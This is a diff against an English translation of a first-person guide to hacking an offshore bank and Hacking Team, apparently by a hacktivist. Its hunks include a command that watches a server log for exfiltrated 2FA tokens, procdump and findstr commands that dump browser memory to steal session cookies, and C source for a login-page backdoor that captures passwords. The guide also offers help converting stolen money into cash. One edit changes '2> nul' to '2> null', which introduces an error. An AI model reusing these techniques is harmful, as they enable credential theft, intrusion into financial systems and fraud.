@@ -256,6 +256,7 @@ La Era de los Dioses Enmascarados y los Reyes Cubiertos
  [2 - Introduction]
 This guide explains how I hacked the Cayman Bank and Trust Company
 (Isle of Man).  Why am I publishing this, almost four years later?
+
  1) To show what is possible
 Hackers working for social change have limited themselves to developing
 security and privacy tools, DDoS, performing vandalism and leaks. 
@@ -304,6 +305,7 @@ get millions. Now, on the other hand, I do have the knowledge and
 connections to get cash more seriously, so if you are hacking a bank 
 but need help to convert that into real money, and you want to use
 that money to finance radical social projects, you can contact me.
+
  3) Collaborate
 It is possible to hack banks as an amateur who works alone, but the net
 is that, in general, it is not as easy as I paint it here.  I was 
@@ -323,17 +325,23 @@ server every time it is detected that they have entered a username. This
 request adds the username to the url and, as they type the token, several
 GETs are made with the token digits concatenated to the url. On my side 
 I leave this running in the meantime:
+
   ssh me@my_secret_server 'tail -f /var/log/apache2/access_log'
     | while read i; do echo $i; aplay alarma.wav &> /dev/null; done
- If it is a web application, you can skip the 2FA by stealing the cookie 
+
+If it is a web application, you can skip the 2FA by stealing the cookie 
 after they have authenticated. I am not an APT with a team of coders who 
 can make me customized tools. I am a simple person who subsists on what
 the terminal gives [2], so what I use is:
+
 procdump64 /accepteula -r -ma PID_of_browser
- strings64 /accepteula * .dmp |  findstr PHPSESSID 2> nul
+ strings64 /accepteula * .dmp |  findstr PHPSESSID 2> null
+
  or going through findstr rather than strings, which makes it much faster:
+
 findstr PHPSESSID * .dmp> tmp
-     strings64 /accepteula tmp |  findstr PHPSESSID 2> nul
+     strings64 /accepteula tmp |  findstr PHPSESSID 2> null
+
 Another way to skip it is to access your session with a hidden VNC (hvnc) 
 after they have authenticated, or with a little creativity you couldalso 
 focus on another part of their process instead of sending SWIFT 
@@ -356,6 +364,7 @@ ________________________________________
          (  (__)\       )\/\
           _) /  ||----w |
          (.)/   ||     ||
+
  [3 - Be careful out there]
 It is important to take some simple precautions.  I will refer to this 
 same section of my last guide [1], since it seems to work just fine [2].
@@ -387,6 +396,7 @@ is not the safest thing in the world (oops!), but at times I feel I have to.
  They often describe us as depraved, decadent and revolting
  But alas! They haven't seen anything yet
 (https://theanarchistlibrary.org/library/mary-nardini-gang-be-gay-do-crime)
+
  [4 - Get access]
 In another place [1] I talked about the main ways to get initial access 
 to a company's network during a targeted attack. However, this was not a
@@ -460,6 +470,7 @@ need great technical knowledge. You just need dedication, and believe in yoursel
  [4.2 - The Backdoor]
 Part of the backdoor I prepared for Hacking Team (see the first footnote in 
 section 6) was a simple wrapper on the login page to capture passwords:
+
 #include <stdio.h>
 #include <unistd.h>
 #include <fcntl.h>
@@ -500,6 +511,7 @@ int main()
                       "userLogin", NULL);
         }
 }
+
 In the case of Hacking Team, they were logging on to the VPN with single-use 
 passwords, so the VPN gave me access only to the network, and from there 
 it took an extra effort to get domain admins on their network. In the other 
@@ -575,8 +587,8 @@ _______________________________________
           _) /  ||----w |
          (.)/   ||     ||
           `'
-[6 - Send the money]
 
+[6 - Send the money]
 I had no idea what I was doing, so I was discovering it along the way.
 Somehow, the first transfers I sent went well. The next day, I screwed 
 up by sending a transfer to Mexico that ended my fun. This bank sent its 
@@ -649,8 +661,8 @@ ___________________________
           _) /  ||----w |
          (.)/   ||     ||
           `'
-[10 - Torrent]
 
+[10 - Torrent]
 Privacy for the weak, transparency for the powerful.
 Offshore banking provides executives, politicians and millionaires with
 privacy from of their own government. Exposing them may sound hypocritical 
@@ -695,6 +707,7 @@ is that they steal from the poor, protected by the law, heaven knows,
 and we get the rich under the sole protection of our own courage. Don't y
 ou have to prefer to be one of us, rather than indulge those villains in 
 search of a job? - Captain Bellamy”
+
 [11 - Learn to hack]
 You don't start hacking well. You start hacking shit, thinking it's good, 
 and then gradually you get better. That is why I always say that one of 
